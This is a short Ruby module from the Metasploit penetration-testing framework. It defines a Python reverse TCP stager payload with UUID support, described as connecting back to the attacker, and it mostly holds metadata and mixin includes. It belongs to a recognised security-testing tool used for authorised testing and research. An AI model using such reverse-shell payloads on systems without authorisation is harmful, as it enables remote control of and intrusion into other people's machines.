##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 601

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseTcp

  def self.handler_type_alias
    'reverse_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Reverse TCP Stager with UUID Support',
      'Description' => 'Connect back to the attacker with UUID Support',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {'Payload' => ""}
    ))
  end

  # Tell the reverse_tcp payload to include the UUID
  def include_send_uuid
    true
  end
end
